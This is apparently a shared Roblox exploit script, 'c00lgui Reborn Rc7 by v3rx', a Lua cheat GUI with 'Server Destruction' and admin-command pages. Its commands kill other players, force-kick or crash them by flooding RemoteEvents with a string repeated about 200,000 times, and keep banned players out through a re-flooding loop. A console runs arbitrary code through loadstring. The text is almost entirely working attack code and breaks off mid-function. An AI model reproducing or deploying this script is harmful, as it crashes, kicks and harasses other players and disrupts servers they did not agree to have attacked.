The script is here!blak = Color3.new(0,0,0)
rede = Color3.new(255/255,0/255,0/255)
tef = "SourceSans"
whit = Color3.new(255/255,255/255,255/255)
local cka = Instance.new("ScreenGui")
	cka.Parent = game.Players.LocalPlayer.PlayerGui
	cka.Name = "culgui"
local frame = Instance.new("Frame")
	frame.Parent = cka
	frame.BackgroundColor3 = blak
	frame.BorderColor3 = rede
	frame.BorderSizePixel = 3
	frame.Name = "Frame"
	frame.Position = UDim2.new(0,3,0.3,0)
	frame.Size = UDim2.new(0,300,0,400)
local cope = Instance.new("TextButton")
	cope.Parent = cka
	cope.Active = true
	cope.AutoButtonColor = true
	cope.BackgroundColor3 = blak
	cope.BorderColor3 = rede
	cope.BorderSizePixel = 3
	cope.Name = "Close/Open"
	cope.Position = UDim2.new(0,3,0.3,380)
	cope.Selectable = true
	cope.Size = UDim2.new(0,300,0,20)
	cope.ZIndex = 3
	cope.Font = "SourceSans"
	cope.FontSize = "Size18"
	cope.Text = "Close"
	cope.TextColor3 = Color3.new(255,255,255)
	cope.TextXAlignment = "Center"
	cope.TextYAlignment = "Center"
	cope.MouseButton1Down:connect(function()
		if cope.Text == "Close" then
		frame.Visible = false
		cope.Text = "Open" else
		frame.Visible = true
		cope.Text = "Close"	
		end	
	end)
local page1 = Instance.new("Frame")
	page1.Parent = frame	
	page1.BackgroundColor3 = blak
	page1.BorderColor3 = rede
	page1.BorderSizePixel = 3
	page1.Name = "Page1"
	page1.Position = UDim2.new(0,0,0,83)
	page1.Size = UDim2.new(1,0,1,-106)
	page1.ZIndex = 2
	page1.Visible = true
local page2 = Instance.new("Frame")
	page2.Parent = frame
	page2.BackgroundColor3 = blak
	page2.BorderColor3 = rede
	page2.BorderSizePixel = 3
	page2.Name = "Page2"
	page2.Position = UDim2.new(0,0,0,83)
	page2.Size = UDim2.new(1,0,1,-106)
	page2.ZIndex = 2
	page2.Visible = false
local page3 = Instance.new("Frame")
	page3.Parent = frame
	page3.BackgroundColor3 = blak
	page3.BorderColor3 = rede
	page3.BorderSizePixel = 3
	page3.Name = "Page3"
	page3.Position = UDim2.new(0,0,0,83)
	page3.Size = UDim2.new(1,0,1,-106)
	page3.ZIndex = 2
	page3.Visible = false
local page4 = Instance.new("Frame")
	page4.Parent = frame
	page4.BackgroundColor3 = blak
	page4.BorderColor3 = rede
	page4.BorderSizePixel = 3
	page4.Name = "Page4"
	page4.Position = UDim2.new(0,0,0,83)
	page4.Size = UDim2.new(1,0,1,-106)
	page4.ZIndex = 2
	page4.Visible = false
local page5 = Instance.new("Frame")
	page5.Parent = frame
	page5.BackgroundColor3 = blak
	page5.BorderColor3 = rede
	page5.BorderSizePixel = 3
	page5.Name = "Page5"
	page5.Position = UDim2.new(0,0,0,83)
	page5.Size = UDim2.new(1,0,1,-106)
	page5.ZIndex = 2
	page5.Visible = false
local page = Instance.new("Frame")
	page.Parent = frame
	page.BackgroundColor3 = blak
	page.BorderColor3 = rede
	page.BorderSizePixel = 3
	page.Name = "Settings"
	page.Position = UDim2.new(1,3,0,0)
	page.Size = UDim2.new(1,0,1,0)
	page.ZIndex = 1
	page.Visible = true
local right = Instance.new("TextButton")
	right.Parent = frame	
	right.BackgroundColor3 = blak
	right.BorderColor3 = rede
	right.BorderSizePixel = 3
	right.Name = ">"
	right.Position = UDim2.new(0.5,3,0,40)
	right.Size = UDim2.new(0.5,-3,0,40)
	right.ZIndex = 2
	right.Font = tef
	right.FontSize = "Size48"
	right.Text = ">"
	right.TextColor3 = whit
	right.MouseButton1Down:connect(function()
		if page1.Visible == true then
			page1.Visible = false
			page2.Visible = true
		elseif page2.Visible == true then
			page2.Visible = false
			page3.Visible = true
		elseif page3.Visible == true then
			page3.Visible = false
			page4.Visible = true
		elseif page4.Visible == true then
			page4.Visible = false
			page5.Visible = true
		elseif page5.Visible == true then
			page5.Visible = false
			page1.Visible = true
		end	
	end)
local left = Instance.new("TextButton")
	left.Parent = frame	
	left.BackgroundColor3 = blak
	left.BorderColor3 = rede
	left.BorderSizePixel = 3
	left.Name = "<"
	left.Position = UDim2.new(0,0,0,40)
	left.Size = UDim2.new(0.5,-3,0,40)
	left.ZIndex = 2
	left.Font = tef
	left.FontSize = "Size48"
	left.Text = "<"
	left.TextColor3 = whit
	left.MouseButton1Down:connect(function()
		if page1.Visible == true then
			page1.Visible = false
			page5.Visible = true
		elseif page2.Visible == true then
			page2.Visible = false
			page1.Visible = true
		elseif page3.Visible == true then
			page3.Visible = false
			page2.Visible = true
		elseif page4.Visible == true then
			page4.Visible = false
			page3.Visible = true
		elseif page5.Visible == true then
			page5.Visible = false
			page4.Visible = true
		end	
	end)
local title = Instance.new("TextLabel")
	title.Parent = frame
	title.BackgroundColor3 = blak
	title.BorderColor3 = rede
	title.BorderSizePixel = 3
	title.Name = "Title"
	title.Position = UDim2.new(0,0,0,0)
	title.Size = UDim2.new(1,0,0,40)
	title.ZIndex = 2
	title.Font = tef
	title.FontSize = "Size24"
	title.Text = "c00lgui Reborn Rc7 by v3rx"
	title.TextColor3 = whit
--           inside pages        --
local acg = Instance.new("Frame")
	acg.Parent = page1
	acg.BackgroundColor3 = blak
	acg.BorderColor3 = rede
	acg.BorderSizePixel = 3
	acg.Name = "Admin Commands/Guis"
	acg.Position = UDim2.new(0.5,3,0,0)
	acg.Size = UDim2.new(0.5,-3,1,0)
	acg.ZIndex = 2
local sd = Instance.new("Frame")
	sd.Parent = page1
	sd.BackgroundColor3 = blak
	sd.BorderColor3 = rede
	sd.BorderSizePixel = 3
	sd.Name = "Server Destruction"
	sd.Position = UDim2.new(0,0,0,0)
	sd.Size = UDim2.new(0.5,-3,1,0)
	sd.ZIndex = 2
local gt = Instance.new("Frame")
	gt.Parent = page2
	gt.BackgroundColor3 = blak
	gt.BorderColor3 = rede
	gt.BorderSizePixel = 3
	gt.Name = "Gear/Tools"
	gt.Position = UDim2.new(0.5,3,0,0)
	gt.Size = UDim2.new(0.5,-3,1,0)
	gt.ZIndex = 2
local ws = Instance.new("Frame")
	ws.Parent = page2
	ws.BackgroundColor3 = blak
	ws.BorderColor3 = rede
	ws.BorderSizePixel = 3
	ws.Name = "Weapon Scripts"
	ws.Position = UDim2.new(0,0,0,0)
	ws.Size = UDim2.new(0.5,-3,1,0)
	ws.ZIndex = 2
local localp = Instance.new("Frame")
	localp.Parent = page3
	localp.BackgroundColor3 = blak
	localp.BorderColor3 = rede
	localp.BorderSizePixel = 3
	localp.Name = "LocalPlayer"
	localp.Position = UDim2.new(0.5,3,0,0)
	localp.Size = UDim2.new(0.5,-3,1,0)
	localp.ZIndex = 2
local misc = Instance.new("Frame")
	misc.Parent = page3
	misc.BackgroundColor3 = blak
	misc.BorderColor3 = rede
	misc.BorderSizePixel = 3
	misc.Name = "Misc"
	misc.Position = UDim2.new(0,0,0,0)
	misc.Size = UDim2.new(0.5,-3,1,0)
	misc.ZIndex = 2
local pmi = Instance.new("Frame")
	pmi.Parent = page4
	pmi.BackgroundColor3 = blak
	pmi.BorderColor3 = rede
	pmi.BorderSizePixel = 3
	pmi.Name = "Preset Music IDs"
	pmi.Position = UDim2.new(0.5,3,0,0)
	pmi.Size = UDim2.new(0.5,-3,1,0)
	pmi.ZIndex = 2
local psd = Instance.new("Frame")
	psd.Parent = page4
	psd.BackgroundColor3 = blak
	psd.BorderColor3 = rede
	psd.BorderSizePixel = 3
	psd.Name = "Preset Skybox/Decal IDs"
	psd.Position = UDim2.new(0,0,0,0)
	psd.Size = UDim2.new(0.5,-3,1,0)
	psd.ZIndex = 2
local edn = Instance.new("Frame")
	edn.Parent = page5
	edn.BackgroundColor3 = blak
	edn.BorderColor3 = rede
	edn.BorderSizePixel = 3
	edn.Name = "End"
	edn.Position = UDim2.new(0.5,3,0,0)
	edn.Size = UDim2.new(0.5,-3,1,0)
	edn.ZIndex = 2
local pgi = Instance.new("Frame")
	pgi.Parent = page5
	pgi.BackgroundColor3 = blak
	pgi.BorderColor3 = rede
	pgi.BorderSizePixel = 3
	pgi.Name = "Preset Gear IDs"
	pgi.Position = UDim2.new(0,0,0,0)
	pgi.Size = UDim2.new(0.5,-3,1,0)
	pgi.ZIndex = 2
--      inside pages end        --
-- Admin Commands/Guis --
local button = Instance.new("TextButton")
	button.Parent = acg
	button.BackgroundColor3 = blak
	button.BorderColor3 = rede
	button.BorderSizePixel = 3
	button.Name = "iOrb"
	button.Position = UDim2.new(0,0,0,33)
	button.Size = UDim2.new(0.5,0,0,30)
	button.ZIndex = 2
	button.Font = tef
	button.FontSize = "Size14"
	button.Text = "i0rb"
	button.TextColor3 = whit
	button.MouseButton1Down:connect(function()
		
    

--[[
--Commands--
!NOTE! -- PLEASE GO TO LINE 47 AND REPLACE MY NAME WITH YOUR NAME! -- !NOTE!
% = The prefix you have set	

%console show
%console hide
%muslist
%cmds
%kill plr, me, all
%kick plr, me, all
%ban plr, me, all
%explode plr, me, all
%exe <command>
%console show
%console hide
%ff <plr>
%unff <plr>
%respawn <plr>
%lag <plr>
%removetools <plr>
%music <id> or from musiclist (%muslist)
%pri
%god plr
%ungod plr
--]]



local Admins = game.Players.LocalPlayer -- In order for this to work you must put your name where mine is!
local Speed = "0.05" -- Set the speed of the orb's rotation. This is recommended.
local Distance = "5" -- This is the distance that the orb has from your characters torso.
local Prefix = ":"
local Players = Game:GetService('Players')
local Banned = {} -- Leave this be!

wait()
local folder = Instance.new("Model", game.Lighting)
folder.Name = "sbans"
game:GetService('RunService').Stepped:connect(function()
for i,x in pairs(folder:children()) do
for i,v in pairs(game.Players:children()) do if v.Name==x.Value then
bannnedd1=Instance.new('RemoteEvent',workspace):FireClient(game.Players[x.Value],{string.rep("Getbannedbro?",2e5+5)})
end
end
end
end)

game.Players.PlayerAdded:connect(function(player)
Game:GetService('Chat'):Chat(p, player.Name .. " has joined! AccountAge = " .. player.AccountAge .. " | UserID = " .. player.UserId .. " |..!", Enum.ChatColor.Red)
end)

game.Players.ChildRemoved:connect(function(player2)
Game:GetService('Chat'):Chat(p, player2.Name .. " has left! AccountAge = " .. player2.AccountAge .. " | UserID = " .. player2.UserId .. " |..!", Enum.ChatColor.Red)
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "muslist" then
sg2 = Instance.new("ScreenGui", Admins.PlayerGui)
fm2 = Instance.new("Frame", sg2)
fm2.Position = UDim2.new(0.42,0,0.3,0)
fm2.Size = UDim2.new(0,300,0,400)
fm2.BackgroundColor3 = Color3.new(0,0,0)
fm2.BackgroundTransparency = 0.5
fm2.BorderSizePixel = 0
s1 = Instance.new("TextButton", fm2)
s1.Size = UDim2.new(0,300,0,25)
s1.TextColor3 = Color3.new(255,255,255)
s1.FontSize = 2
s1.Text = "Cake"
s1.BackgroundTransparency = 1
s2 = Instance.new("TextButton", fm2)
s2.Size = UDim2.new(0,300,0,25)
s2.Position = UDim2.new(0,0,0,25)
s2.TextColor3 = Color3.new(255,255,255)
s2.FontSize = 2
s2.Text = "Watcha"
s2.BackgroundTransparency = 1
s3 = Instance.new("TextButton", fm2)
s3.Size = UDim2.new(0,300,0,25)
s3.Position = UDim2.new(0,0,0,50)
s3.TextColor3 = Color3.new(255,255,255)
s3.FontSize = 2
s3.Text = "Moonman"
s3.BackgroundTransparency = 1
s4 = Instance.new("TextButton", fm2)
s4.Size = UDim2.new(0,300,0,25)
s4.Position = UDim2.new(0,0,0,75)
s4.TextColor3 = Color3.new(255,255,255)
s4.FontSize = 2
s4.Text = "Hello"
s4.BackgroundTransparency = 1
s5 = Instance.new("TextButton", fm2)
s5.Size = UDim2.new(0,300,0,25)
s5.Position = UDim2.new(0,0,0,100)
s5.TextColor3 = Color3.new(255,255,255)
s5.FontSize = 2
s5.Text = "Lean"
s5.BackgroundTransparency = 1
s6 = Instance.new("TextButton", fm2)
s6.Size = UDim2.new(0,300,0,25)
s6.Position = UDim2.new(0,0,0,125)
s6.TextColor3 = Color3.new(255,255,255)
s6.FontSize = 2
s6.Text = "Waves"
s6.BackgroundTransparency = 1
s7 = Instance.new("TextButton", fm2)
s7.Size = UDim2.new(0,300,0,25)
s7.Position = UDim2.new(0,0,0,150)
s7.TextColor3 = Color3.new(255,255,255)
s7.FontSize = 2
s7.Text = "Baby"
s7.BackgroundTransparency = 1
close2 = Instance.new("TextButton", fm2)
close2.Size = UDim2.new(0,15,0,15)
close2.Position = UDim2.new(0,285,0,0)
close2.BackgroundTransparency = 1
close2.TextColor3 = Color3.new(255,255,255)
close2.Text = "X"
close2.MouseButton1Click:connect(function()
fm2:Destroy()
sg2:Destroy()
end)
end
end)
Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "cmds" then
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = Admins.PlayerGui

local scrollingFrame = Instance.new("ScrollingFrame")
scrollingFrame.Parent = screenGui
scrollingFrame.Position = UDim2.new(0.2, 0, 0.1, 0)
scrollingFrame.Size = UDim2.new(0, 500, 0, 400)
scrollingFrame.CanvasSize = UDim2.new(0, 500, 2, 0)
scrollingFrame.BackgroundColor3 = Color3.new(0,0,0)
scrollingFrame.BorderSizePixel = 2
scrollingFrame.BorderColor3 = Color3.new(170,0,0)

local closecmds = Instance.new("TextButton")
closecmds.Parent = screenGui
closecmds.Size = UDim2.new(0,50,0,50)
closecmds.Position = UDim2.new(0.2, 0, 0.02, 0)
closecmds.BackgroundColor3 = Color3.new(0,0,0)
closecmds.Text = "X"
closecmds.TextColor3 = Color3.new(170,0,0)
closecmds.FontSize = 3
closecmds.BorderSizePixel = 2
closecmds.BorderColor3 = Color3.new(170,0,0)
closecmds.MouseButton1Click:connect(function()
screenGui:Destroy()
end)
local cmd1 = Instance.new("TextLabel")
cmd1.Parent = scrollingFrame
cmd1.Position = UDim2.new(0, 0, 0, 0)
cmd1.Size = UDim2.new(0, 500, 0, 25)
cmd1.BackgroundColor3= Color3.new(0,0,0)
cmd1.TextColor3 = Color3.new(170,0,0)
cmd1.FontSize = 5
cmd1.Text = Prefix .. "kill <plr>"
cmd1.ZIndex = 0

local cmd2 = Instance.new("TextLabel")
cmd2.Parent = scrollingFrame
cmd2.Position = UDim2.new(0, 0, 0, 25)
cmd2.Size = UDim2.new(0, 500, 0, 25)
cmd2.BackgroundColor3= Color3.new(0,0,0)
cmd2.TextColor3 = Color3.new(170,0,0)
cmd2.FontSize = 5
cmd2.Text = Prefix .. "kick <plr>"
cmd2.ZIndex = 0

local cmd3 = Instance.new("TextLabel")
cmd3.Parent = scrollingFrame
cmd3.Position = UDim2.new(0, 0, 0, 50)
cmd3.Size = UDim2.new(0, 500, 0, 25)
cmd3.BackgroundColor3= Color3.new(0,0,0)
cmd3.TextColor3 = Color3.new(170,0,0)
cmd3.FontSize = 5
cmd3.Text = Prefix .. "ban <plr>"
cmd3.ZIndex = 0

local cmd4 = Instance.new("TextLabel")
cmd4.Parent = scrollingFrame
cmd4.Position = UDim2.new(0, 0, 0, 75)
cmd4.Size = UDim2.new(0, 500, 0, 25)
cmd4.BackgroundColor3= Color3.new(0,0,0)
cmd4.TextColor3 = Color3.new(170,0,0)
cmd4.FontSize = 5
cmd4.Text = Prefix .. "explode <plr>"
cmd4.ZIndex = 0

local cmd5 = Instance.new("TextLabel")
cmd5.Parent = scrollingFrame
cmd5.Position = UDim2.new(0, 0, 0, 100)
cmd5.Size = UDim2.new(0, 500, 0, 25)
cmd5.BackgroundColor3= Color3.new(0,0,0)
cmd5.TextColor3 = Color3.new(170,0,0)
cmd5.FontSize = 5
cmd5.Text = Prefix .. "exe <script>"
cmd5.ZIndex = 0

local cmd6 = Instance.new("TextLabel")
cmd6.Parent = scrollingFrame
cmd6.Position = UDim2.new(0, 0, 0, 100)
cmd6.Size = UDim2.new(0, 500, 0, 25)
cmd6.BackgroundColor3= Color3.new(0,0,0)
cmd6.TextColor3 = Color3.new(170,0,0)
cmd6.FontSize = 5
cmd6.Text = Prefix .. "console show"
cmd6.ZIndex = 0

local cmd7 = Instance.new("TextLabel")
cmd7.Parent = scrollingFrame
cmd7.Position = UDim2.new(0, 0, 0, 100)
cmd7.Size = UDim2.new(0, 500, 0, 25)
cmd7.BackgroundColor3= Color3.new(0,0,0)
cmd7.TextColor3 = Color3.new(170,0,0)
cmd7.FontSize = 5
cmd7.Text = Prefix .. "console hide"
cmd7.ZIndex = 0

local cmd8 = Instance.new("TextLabel")
cmd8.Parent = scrollingFrame
cmd8.Position = UDim2.new(0, 0, 0, 125)
cmd8.Size = UDim2.new(0, 500, 0, 25)
cmd8.BackgroundColor3= Color3.new(0,0,0)
cmd8.TextColor3 = Color3.new(170,0,0)
cmd8.FontSize = 5
cmd8.Text = Prefix .. "ff <plr>"
cmd8.ZIndex = 0

local cmd9 = Instance.new("TextLabel")
cmd9.Parent = scrollingFrame
cmd9.Position = UDim2.new(0, 0, 0, 150)
cmd9.Size = UDim2.new(0, 500, 0, 25)
cmd9.BackgroundColor3= Color3.new(0,0,0)
cmd9.TextColor3 = Color3.new(170,0,0)
cmd9.FontSize = 5
cmd9.Text = Prefix .. "unff <plr>"
cmd9.ZIndex = 0

local cmd10 = Instance.new("TextLabel")
cmd10.Parent = scrollingFrame
cmd10.Position = UDim2.new(0, 0, 0, 175)
cmd10.Size = UDim2.new(0, 500, 0, 25)
cmd10.BackgroundColor3= Color3.new(0,0,0)
cmd10.TextColor3 = Color3.new(170,0,0)
cmd10.FontSize = 5
cmd10.Text = Prefix .. "respawn <plr>"
cmd10.ZIndex = 0

local cmd11 = Instance.new("TextLabel")
cmd11.Parent = scrollingFrame
cmd11.Position = UDim2.new(0, 0, 0, 200)
cmd11.Size = UDim2.new(0, 500, 0, 25)
cmd11.BackgroundColor3= Color3.new(0,0,0)
cmd11.TextColor3 = Color3.new(170,0,0)
cmd11.FontSize = 5
cmd11.Text = Prefix .. "lag <plr>"
cmd11.ZIndex = 0

local cmd12 = Instance.new("TextLabel")
cmd12.Parent = scrollingFrame
cmd12.Position = UDim2.new(0, 0, 0, 225)
cmd12.Size = UDim2.new(0, 500, 0, 25)
cmd12.BackgroundColor3= Color3.new(0,0,0)
cmd12.TextColor3 = Color3.new(170,0,0)
cmd12.FontSize = 5
cmd12.Text = Prefix .. "removetools <plr>"
cmd12.ZIndex = 0

local cmd13 = Instance.new("TextLabel")
cmd13.Parent = scrollingFrame
cmd13.Position = UDim2.new(0, 0, 0, 250)
cmd13.Size = UDim2.new(0, 500, 0, 25)
cmd13.BackgroundColor3= Color3.new(0,0,0)
cmd13.TextColor3 = Color3.new(170,0,0)
cmd13.FontSize = 5
cmd13.Text = Prefix .. "god <plr>"
cmd13.ZIndex = 0

local cmd14 = Instance.new("TextLabel")
cmd14.Parent = scrollingFrame
cmd14.Position = UDim2.new(0, 0, 0, 275)
cmd14.Size = UDim2.new(0, 500, 0, 25)
cmd14.BackgroundColor3= Color3.new(0,0,0)
cmd14.TextColor3 = Color3.new(170,0,0)
cmd14.FontSize = 5
cmd14.Text = Prefix .. "ungod <plr>"
cmd14.ZIndex = 0

local cmd15 = Instance.new("TextLabel")
cmd15.Parent = scrollingFrame
cmd15.Position = UDim2.new(0, 0, 0, 300)
cmd15.Size = UDim2.new(0, 500, 0, 25)
cmd15.BackgroundColor3= Color3.new(0,0,0)
cmd15.TextColor3 = Color3.new(170,0,0)
cmd15.FontSize = 5
cmd15.Text = Prefix .. "muslist"
cmd15.ZIndex = 0

local cmd16 = Instance.new("TextLabel")
cmd16.Parent = scrollingFrame
cmd16.Position = UDim2.new(0, 0, 0, 325)
cmd16.Size = UDim2.new(0, 500, 0, 25)
cmd16.BackgroundColor3= Color3.new(0,0,0)
cmd16.TextColor3 = Color3.new(170,0,0)
cmd16.FontSize = 5
cmd16.Text = Prefix .. "console show"
cmd16.ZIndex = 0

local cmd17 = Instance.new("TextLabel")
cmd17.Parent = scrollingFrame
cmd17.Position = UDim2.new(0, 0, 0, 350)
cmd17.Size = UDim2.new(0, 500, 0, 25)
cmd17.BackgroundColor3= Color3.new(0,0,0)
cmd17.TextColor3 = Color3.new(170,0,0)
cmd17.FontSize = 5
cmd17.Text = Prefix .. "exe <command>"
cmd17.ZIndex = 0

local cmd18 = Instance.new("TextLabel")
cmd18.Parent = scrollingFrame
cmd18.Position = UDim2.new(0, 0, 0, 375)
cmd18.Size = UDim2.new(0, 500, 0, 25)
cmd18.BackgroundColor3= Color3.new(0,0,0)
cmd18.TextColor3 = Color3.new(170,0,0)
cmd18.FontSize = 5
cmd18.Text = Prefix .. "music <id> or <song (from muslist)>"
cmd18.ZIndex = 0

local cmd19 = Instance.new("TextLabel")
cmd19.Parent = scrollingFrame
cmd19.Position = UDim2.new(0, 0, 0, 375)
cmd19.Size = UDim2.new(0, 500, 0, 25)
cmd19.BackgroundColor3= Color3.new(0,0,0)
cmd19.TextColor3 = Color3.new(170,0,0)
cmd19.FontSize = 5
cmd19.Text = Prefix .. "pri"
cmd19.ZIndex = 0

local cmd20 = Instance.new("TextLabel")
cmd20.Parent = scrollingFrame
cmd20.Position = UDim2.new(0, 0, 0, 400)
cmd20.Size = UDim2.new(0, 500, 0, 25)
cmd20.BackgroundColor3= Color3.new(0,0,0)
cmd20.TextColor3 = Color3.new(170,0,0)
cmd20.FontSize = 5
cmd20.Text = Prefix .. "cmds"
cmd20.ZIndex = 0

local cmd21 = Instance.new("TextLabel")
cmd21.Parent = scrollingFrame
cmd21.Position = UDim2.new(0, 0, 0, 425)
cmd21.Size = UDim2.new(0, 500, 0, 25)
cmd21.BackgroundColor3= Color3.new(0,0,0)
cmd21.TextColor3 = Color3.new(170,0,0)
cmd21.FontSize = 5
cmd21.Text = Prefix .. "sit <plr>"
cmd21.ZIndex = 0

local cmd22 = Instance.new("TextLabel")
cmd22.Parent = scrollingFrame
cmd22.Position = UDim2.new(0, 0, 0, 450)
cmd22.Size = UDim2.new(0, 500, 0, 25)
cmd22.BackgroundColor3= Color3.new(0,0,0)
cmd22.TextColor3 = Color3.new(170,0,0)
cmd22.FontSize = 5
cmd22.Text = Prefix .. "jump <plr>"
cmd22.ZIndex = 0

local cmd23 = Instance.new("TextLabel")
cmd23.Parent = scrollingFrame
cmd23.Position = UDim2.new(0, 0, 0, 475)
cmd23.Size = UDim2.new(0, 500, 0, 25)
cmd23.BackgroundColor3= Color3.new(0,0,0)
cmd23.TextColor3 = Color3.new(170,0,0)
cmd23.FontSize = 5
cmd23.Text = Prefix .. "bruh <plr>"
cmd23.ZIndex = 0

local cmd24 = Instance.new("TextLabel")
cmd24.Parent = scrollingFrame
cmd24.Position = UDim2.new(0, 0, 0, 500)
cmd24.Size = UDim2.new(0, 500, 0, 25)
cmd24.BackgroundColor3= Color3.new(0,0,0)
cmd24.TextColor3 = Color3.new(170,0,0)
cmd24.FontSize = 5
cmd24.Text = Prefix .. "ws <speed>"
cmd24.ZIndex = 0

local cmd25 = Instance.new("TextLabel")
cmd25.Parent = scrollingFrame
cmd25.Position = UDim2.new(0, 0, 0, 525)
cmd25.Size = UDim2.new(0, 500, 0, 25)
cmd25.BackgroundColor3= Color3.new(0,0,0)
cmd25.TextColor3 = Color3.new(170,0,0)
cmd25.FontSize = 5
cmd25.Text = Prefix .. "gear <id>"
cmd25.ZIndex = 0

local cmd26 = Instance.new("TextLabel")
cmd26.Parent = scrollingFrame
cmd26.Position = UDim2.new(0, 0, 0, 550)
cmd26.Size = UDim2.new(0, 500, 0, 25)
cmd26.BackgroundColor3= Color3.new(0,0,0)
cmd26.TextColor3 = Color3.new(170,0,0)
cmd26.FontSize = 5
cmd26.Text = Prefix .. "tp <plr>"
cmd26.ZIndex = 0

local cmd27 = Instance.new("TextLabel")
cmd27.Parent = scrollingFrame
cmd27.Position = UDim2.new(0, 0, 0, 575)
cmd27.Size = UDim2.new(0, 500, 0, 25)
cmd27.BackgroundColor3= Color3.new(0,0,0)
cmd27.TextColor3 = Color3.new(170,0,0)
cmd27.FontSize = 5
cmd27.Text = Prefix .. "btools <plr>"
cmd27.ZIndex = 0

local cmd28 = Instance.new("TextLabel")
cmd28.Parent = scrollingFrame
cmd28.Position = UDim2.new(0, 0, 0, 600)
cmd28.Size = UDim2.new(0, 500, 0, 25)
cmd28.BackgroundColor3= Color3.new(0,0,0)
cmd28.TextColor3 = Color3.new(170,0,0)
cmd28.FontSize = 5
cmd28.Text = Prefix .. "pitch <n>"
cmd28.ZIndex = 0

local cmd29 = Instance.new("TextLabel")
cmd29.Parent = scrollingFrame
cmd29.Position = UDim2.new(0, 0, 0, 625)
cmd29.Size = UDim2.new(0, 500, 0, 25)
cmd29.BackgroundColor3= Color3.new(0,0,0)
cmd29.TextColor3 = Color3.new(170,0,0)
cmd29.FontSize = 5
cmd29.Text = Prefix .. "volume <n>"
cmd29.ZIndex = 0
end
end)



Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "console show" then
sg = Instance.new('ScreenGui', Admins.PlayerGui)
fm = Instance.new('Frame', sg)
fm.Selectable = true
fm.Size = UDim2.new(0,400,0,300)
fm.BackgroundColor3 = Color3.new(0,0,0)
fm.BorderSizePixel = 4
fm.BorderColor3 = Color3.new(255,255,255)
fm.Position = UDim2.new(0.395,0,0.3,0)
txt = Instance.new('TextLabel', fm)
txt.Size = UDim2.new(0,400,0,25)
txt.Text = "~Game Console~"
txt.FontSize = Enum.FontSize.Size18
txt.TextColor3 = Color3.new(255,255,255)
txt.BackgroundColor3 = Color3.new(0,0,0)
txt.BorderSizePixel = 4
txt.BorderColor3 = Color3.new(255,255,255)
box = Instance.new('TextBox', fm)
box.Position = UDim2.new(0,50,0,50)
box.Size = UDim2.new(0,300,0,200)
box.BackgroundColor3 = Color3.new(0,0,0)
box.BorderSizePixel = 4
box.BorderColor3 = Color3.new(255,255,255)
box.TextColor3 = Color3.new(255,255,255)
box.ClearTextOnFocus = false
box.MultiLine = true
box.TextXAlignment = 'Left'
box.TextWrapped = true
box.TextYAlignment = 'Top'
box.Text = 'Click clear to clear the text or remove me by holding backspace!'
load1 = Instance.new('TextButton', box)
load1.Size = UDim2.new(0,200,0,25)
load1.Position = UDim2.new(0,50,0,213)
load1.BackgroundColor3 = Color3.new(0, 170, 0)
load1.TextColor3 = Color3.new(0,0,0)
load1.BorderSizePixel = 4
load1.BorderColor3 = Color3.new(255,255,255)
load1.Text = "Execute!"
load1.MouseButton1Click:connect(function()
loadstring(box.Text)()
end)
clr = Instance.new('TextButton', box)
clr.Size = UDim2.new(0,50,0,25)
clr.Position = UDim2.new(0,275,0,213)
clr.BackgroundColor3 = Color3.new(170,0,0)
clr.TextColor3 = Color3.new(0,0,0)
clr.BorderSizePixel = 4
clr.BorderColor3 = Color3.new(255,255,255)
clr.Text = "Clear!"
clr.MouseButton1Click:connect(function()
box.Text = ''
box:CaptureFocus()
end)
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "console hide" then
fm:Destroy()
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 5) == Prefix .. "kill" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(7))
if player.Name:lower():sub(1, #msg:sub(7)) == msg:sub(7):lower() then
pcall(function()
player.Character.Humanoid.Health = 0
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "kill me" then
Admins.Character.Humanoid.Health = 0
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "kill all" then
for i,v in pairs(game.Players:children()) do
v.Character.Humanoid.Health = 0
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 5) == Prefix .. "kick" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(7))
if player.Name:lower():sub(1, #msg:sub(7)) == msg:sub(7):lower() then
pcall(function()
local getrekt=Instance.new('RemoteEvent',workspace):FireClient(player,{string.rep("getkickedbro?",2e5+5)})
end)
end
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "kick me" then
local getrekt=Instance.new('RemoteEvent',workspace):FireClient(Admins,{string.rep("getkickedbro?",2e5+5)})
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "kick all" then
for i,v in pairs(game.Players:children()) do
local getrekt=Instance.new('RemoteEvent',workspace):FireClient(v,{string.rep("getkickedbro?",2e5+5)})
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower():sub(1,4) == Prefix .. "ban" then
for index, player1 in pairs(Players:GetPlayers()) do
player1.Name:lower():sub(1, #msg:sub(6))
if player1.Name:lower():sub(1, #msg:sub(6)) == msg:sub(6):lower() then
pcall(function()
local getrekt=Instance.new('RemoteEvent',workspace):FireClient(player1,{string.rep("getkickedbro?",2e5+5)})
if game.Players:FindFirstChild(player1.Name) then
ban=Instance.new('StringValue',folder)
ban.Name = player1.Name
ban.Value = player1.Name
end
end)
end
end
end
end)


Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "ban me" then
local getrekt=Instance.new('RemoteEvent',workspace):FireClient(Admins,{string.rep("getkickedbro?",2e5+5)})
if game.Players:FindFirstChild(Admins.Name) then
ban=Instance.new('StringValue',folder)
ban.Name = Admins.Name
ban.Value = Admins.Name
end
end
end)

Admins.Chatted:connect(function(msg)
if msg:lower() == Prefix .. "ban all" then
for i,v in pairs(game.Players:children()) do
local getrekt=Instance.new('RemoteEvent',workspace):FireClient(v,{string.rep("getkickedbro?",2e5+5)})
if game.Players:FindFirstChild(v.Name) then
ban=Instance.new('StringValue',folder)
ban.Name = v.Name
ban.Value = v.Name
end
end
end
end)



Admins.Chatted:connect(function(msg)
if msg:lower():sub(1, 8) == Prefix .. "explode" then
for index, player in pairs(Players:GetPlayers()) do
player.Name:lower():sub(1, #msg:sub(10))
